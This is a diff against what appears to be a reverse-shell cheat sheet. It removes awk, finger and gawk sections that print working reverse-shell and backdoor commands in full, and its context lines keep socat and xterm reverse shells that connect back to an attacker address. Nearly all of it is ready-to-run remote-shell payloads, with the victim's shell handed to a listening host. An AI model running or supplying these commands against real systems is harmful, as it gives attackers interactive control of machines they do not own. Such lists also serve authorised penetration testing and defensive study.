@@ -206,55 +206,6 @@ attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 
-## Awk
-
-```bash
-awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
-```
-
-## Finger
-
-**Attacker**
-
-```bash
-while true; do nc -l 79; done
-```
-
-To send the command write it down, press enter and press CTRL+D (to stop STDIN)
-
-**Victim**
-
-```bash
-export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
-
-export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
-```
-
-## Gawk
-
-```bash
-#!/usr/bin/gawk -f
-
-BEGIN {
-        Port    =       8080
-        Prompt  =       "bkd> "
-
-        Service = "/inet/tcp/" Port "/0/0"
-        while (1) {
-                do {
-                        printf Prompt |& Service
-                        Service |& getline cmd
-                        if (cmd) {
-                                while ((cmd |& getline) > 0)
-                                        print $0 |& Service
-                                close(cmd)
-                        }
-                } while (cmd != "exit")
-                close(Service)
-        }
-}
-```
-
 ## Xterm
 
 One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
